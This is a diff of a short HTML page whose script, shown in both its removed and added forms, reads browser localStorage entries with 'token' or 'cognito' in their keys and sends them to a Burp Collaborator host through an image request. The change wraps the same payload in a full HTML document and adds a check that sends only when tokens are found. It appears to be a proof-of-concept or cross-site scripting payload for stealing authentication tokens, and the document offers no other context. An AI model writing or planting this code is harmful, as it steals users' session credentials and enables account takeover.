@@ -1,10 +1,17 @@
-<script>
-  let data = '';
-  for (let i = 0; i < localStorage.length; i++) {
-    let key = localStorage.key(i);
-    if (key.toLowerCase().includes("token") || key.toLowerCase().includes("cognito")) {
-      data += key + '=' + localStorage.getItem(key) + '&';
-    }
-  }
-  new Image().src = "https://zhkpj3ywa31n5ocuyrt0v0ti096zuo.burpcollaborator.net/?" + encodeURIComponent(data);
-</script>
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      let data = '';
+      for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        if (key.toLowerCase().includes("token") || key.toLowerCase().includes("cognito")) {
+          data += key + '=' + localStorage.getItem(key) + '&';
+        }
+      }
+      if (data.length > 0) {
+        new Image().src = "https://zhkpj3ywa31n5ocuyrt0v0ti096zuo.burpcollaborator.net/?" + encodeURIComponent(data);
+      }
+    </script>
+  </body>
+</html>
